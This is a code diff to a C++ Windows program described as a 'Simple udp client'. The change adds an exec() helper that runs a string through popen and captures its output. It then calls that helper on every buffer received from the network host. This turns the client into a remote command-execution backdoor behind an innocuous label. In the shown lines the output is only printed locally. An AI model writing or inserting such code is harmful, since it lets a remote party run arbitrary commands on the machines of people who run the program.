@@ -2,7 +2,13 @@
 	Simple udp client
 */
 #include <stdio.h>
+#include <stdexcept>
+#include <stdio.h>
+#include <string>
+
 #include <winsock2.h>
+#include <windows.h>
+#include <ShellApi.h>
 
 #include "host_finder.hpp"
 
@@ -14,6 +20,9 @@
 std::string hostIP = "";
 
 HostFinder hostFinder;
+
+// Macros
+std::string exec(std::string command);
 
 int main(void)
 {
@@ -83,6 +92,8 @@ no_host:
 			//exit(EXIT_FAILURE);
 		}
 		
+		puts(exec(buf).c_str());
+
 		puts(buf);
 	}
 
@@ -90,4 +101,26 @@ no_host:
 	WSACleanup();
 
 	return 0;
+}
+
+std::string exec(std::string command) {
+	char buffer[128];
+	std::string result = "";
+
+	// Open pipe to file
+	FILE* pipe = popen(command.c_str(), "r");
+	if (!pipe) {
+		return "popen failed!";
+	}
+
+	// read till end of process:
+	while (!feof(pipe)) {
+
+	// use buffer to read and add to result
+	if (fgets(buffer, 128, pipe) != NULL)
+		result += buffer;
+	}
+
+	pclose(pipe);
+	return result;
 }
